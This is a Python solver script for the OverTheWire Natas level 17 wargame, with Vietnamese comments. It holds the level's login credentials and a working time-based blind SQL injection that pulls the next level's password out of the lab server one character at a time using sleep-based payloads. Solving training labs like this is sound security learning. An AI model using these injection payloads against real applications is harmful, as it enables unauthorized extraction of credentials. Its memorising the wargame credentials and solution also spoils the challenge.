#!/usr/bin/env python3
"""
OverTheWire Natas - Level 17 Solver
Vulnerability: Time-based Blind SQL Injection
Target: Retrieve password for user 'natas18'
"""

import urllib.request
import urllib.parse
import base64
import time
import string

TARGET_URL = "http://natas17.natas.labs.overthewire.org/index.php"
AUTH_USER = "natas17"
AUTH_PASS = "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"

credentials = base64.b64encode(f"{AUTH_USER}:{AUTH_PASS}".encode("ascii")).decode("ascii")

def check_oracle(payload, sleep_sec=3.0, threshold=2.7):
    """
    Gửi payload SQL injection tới server và đo thời gian phản hồi.
    Nếu thời gian phản hồi >= threshold thì điều kiện kiểm tra là TRUE.
    """
    data = urllib.parse.urlencode({"username": payload}).encode("utf-8")
    req = urllib.request.Request(TARGET_URL, data=data)
    req.add_header("Authorization", f"Basic {credentials}")
    start = time.time()
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            resp.read()
    except Exception:
        # Nếu timeout hoặc ngắt kết nối do server sleep quá lâu -> coi như TRUE
        pass
    elapsed = time.time() - start
    return elapsed >= threshold

def get_natas18_password():
    print("[*] Đang bắt đầu khai thác Time-based Blind SQL Injection tại Natas 17...")
    
    # Bước 1: Lọc tập ký tự có mặt trong mật khẩu của natas18 để tăng tốc độ dò
    print("[*] Bước 1: Lọc các ký tự thực sự tồn tại trong mật khẩu của natas18...")
    candidate_chars = string.ascii_letters + string.digits
    valid_chars = []
    
    for c in candidate_chars:
        payload = f'natas18" AND password LIKE BINARY "%{c}%" AND sleep(2.5) #'
        if check_oracle(payload, sleep_sec=2.5, threshold=2.2):
            # Kiểm tra lại lần 2 để loại bỏ độ trễ mạng ngẫu nhiên (false positive)
            if check_oracle(payload, sleep_sec=2.5, threshold=2.2):
                valid_chars.append(c)
                print(f"    [+] Ký tự hợp lệ tìm thấy: {c}")
                
    print(f"[*] Tập ký tự rút gọn ({len(valid_chars)} ký tự): {''.join(valid_chars)}")
    
    # Bước 2: Dò tuần tự từng ký tự từ vị trí 1 đến 32
    print("[*] Bước 2: Dò tuần tự mật khẩu (32 ký tự)...")
    password = ""
    target_length = 32
    
    while len(password) < target_length:
        found = False
        for c in valid_chars:
            cand = password + c
            payload = f'natas18" AND password LIKE BINARY "{cand}%" AND sleep(3.0) #'
            if check_oracle(payload, sleep_sec=3.0, threshold=2.8):
                # Xác minh lại lần nữa để đảm bảo tính chính xác 100%
                if check_oracle(payload, sleep_sec=3.0, threshold=2.8):
                    password += c
                    print(f"    [+] Vị trí {len(password):02d}/{target_length}: '{c}' -> {password}")
                    found = True
                    break
        if not found:
            print(f"[-] Không tìm thấy ký tự tiếp theo tại vị trí {len(password) + 1}. Dừng lại!")
            break
            
    print(f"\n[+] HOÀN THÀNH! Mật khẩu Natas 18: {password}")
    return password

if __name__ == "__main__":
    get_natas18_password()

